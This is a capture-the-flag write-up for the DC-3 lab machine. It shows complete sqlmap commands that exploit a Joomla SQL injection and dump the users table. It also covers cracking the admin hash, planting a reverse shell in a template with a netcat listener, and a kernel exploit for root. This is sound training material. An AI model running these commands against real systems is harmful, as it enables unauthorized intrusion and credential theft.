## Nmap

Single port open let's see what we can find on the website.

## HTTP

![](images/dc3/website.png)

This looks like a Joomla website. I found nothing in it's source.

Let's run dirsearch and see if we can find anything:

![](images/dc3/dirsearch.png)

There are quite a few pages. Let's see if we can find anything in them.

None of them had anything interesting so I decided to run joomscan.

![](images/dc3/version.png)

we don't find anything interesting. Let's see if that version of joomla is vulnerable to anything.

I used `searchsploit` to find that and got a hit for a `SQL injection vulnerability`.

I tried to use the given examples in exploit manually but nothing worked so I decided to run the given SQLMAP command.

```bash
sqlmap -u "http://192.168.1.111/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```

![](images/dc3/sqlmap.png)

We can see that there are 5 databases available. And the unique one is `joomladb`. Let's try to read it using `sqlmap`.

For that we can use the following command:

```bash
sqlmap -u "http://192.168.1.111/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb --tables
```

![](images/dc3/user-table.png)

This returns lot of tables but the interesting one is `#__users` because it stores username and passwords.

We can dump credentials using the following command:

```bash
$ sqlmap -u "http://192.168.1.111/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb --tables -T '#__users' -C name,password --dump
```

![](images/dc3/creds.png)

Username is `admin` but the password is bcrypt encrypted. We can try to crack this using john or hashcat.

I used john to crack the password.

![](images/dc3/cracking.png)

So now we have the credentials i.e `admin:snoopy`

Since we are in we can just edit some template to get us a reverse shell.

* I uploaded my reverse shell code on the `index.php` of beez3 template i.e `httsp://IP/administrator/index.php?option=com_templates&view=template&id=503&file=L2luZGV4LnBocA`

* Setup my listner i.e `nc -nlvp 4444` and
* Visited `http://IP/templates/beez3/index.php` and got a reverse shell

I am in the system so I used my beloved enumeration script to see if I can find something juicy :)

I found that `dc3` had a sudoer history:

![](images/dc3/sudoer.png)

And that the kernel is not updated.

![](images/dc3/kernel.png)

I checked the `lsb_release`:

![](images/dc3/release.png)

Now using this we can search for an exploit.

![](images/dc3/kernel-exp.png)

We can use this to get the privilege escalation.

***

## Privilege escalation

I used the github URL to download the exploit:

![](images/dc3/download.png)

There was a `compile.sh` using that I compiled everything. Using python's HTTP server transfered everything to the machine.

![](images/dc3/transfer.png)

I ran the file and got the root shell.

Nice little machine. Thanks to [@DCUA7](https://twitter.com/DCAU7/) for the machine.
